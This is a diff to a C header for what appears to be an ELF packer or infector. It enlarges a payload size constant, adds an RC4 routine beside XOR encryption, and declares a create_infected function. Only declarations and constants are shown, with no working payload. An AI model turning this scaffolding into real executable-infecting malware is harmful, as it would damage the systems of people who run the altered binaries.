@@ -28,10 +28,10 @@
 
 #define X86_64 2
 
-#define PAYLOAD_SIZE 137
+#define PAYLOAD_SIZE 374
 #define PAGE_SIZE 4096
 
-#define DEFAULT_SIZE 16
+#define DEFAULT_SIZE 8
 
 #define VOID __attribute__((unused))
 
@@ -93,9 +93,11 @@ void create_infected(t_elf const *elf);
 void *constructor(size_t const size);
 void _memcpy(void *dst, void const *src, size_t const size);
 void _memset(void *dst, int const c, const size_t size);
+size_t _strlen(const char *str);
 
-char *generate_key(const size_t size);
+unsigned char *generate_key(const size_t size);
 
 void _xor(char *str, size_t const size, char const *key);
+void _rc4(const unsigned char *key, const size_t key_length, char *data, const size_t data_length);
 
 #endif
